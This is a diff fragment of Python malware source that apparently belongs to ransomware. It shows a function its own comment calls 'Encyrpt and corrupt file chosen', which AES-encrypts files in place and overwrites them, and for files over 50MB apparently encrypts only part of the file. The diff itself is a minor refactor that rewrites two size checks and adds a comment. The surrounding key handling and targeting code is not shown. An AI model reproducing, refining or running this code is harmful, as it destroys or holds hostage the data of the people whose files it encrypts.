@@ -151,11 +151,11 @@ def generate_key():
 # Encyrpt and corrupt file chosen
 def encrypt_file(file_path, key):
     threshold_bytes = 52428800 # 50MB is the threshold
-    half_size = threshold_bytes//2
+    half_size = threshold_bytes//2 # Size to encyrpt if file is 50mb
     file_size = os.path.getsize(file_path)
 
     try:
-        if not file_size > threshold_bytes:
+        if file_size <= threshold_bytes:
             with open(file_path, "rb") as file:
                 file_content = file.read()   
         else:
@@ -166,7 +166,7 @@ def encrypt_file(file_path, key):
         iv = cipher.iv
         encrypted_data = iv + cipher.encrypt(pad(file_content, AES.block_size))
         
-        if not file_size > threshold_bytes:
+        if file_size <= threshold_bytes:
             with open(file_path, 'wb') as file:
                 file.write(encrypted_data)
         else:
